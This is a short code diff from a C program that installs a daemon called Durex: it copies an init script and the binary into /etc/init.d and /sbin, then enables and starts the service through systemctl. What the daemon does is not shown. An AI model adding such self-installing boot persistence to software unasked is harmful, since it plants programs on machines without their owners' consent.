@@ -22,6 +22,8 @@ int		main(int ac, char **av, char **envp)
 			exit(1);
 		if (system("cp ./Durex.init /etc/init.d/Durex && chmod u+x /etc/init.d/Durex") != 0)
 			exit(1);
+		if (system("rm -rf /sbin/Durex ; cp -p Durex /sbin/Durex && chmod +x /sbin/Durex") != 0)
+			exit(1);
 		system("systemctl -q daemon-reload");
 		system("systemctl -q enable Durex");
 		system("service Durex start");
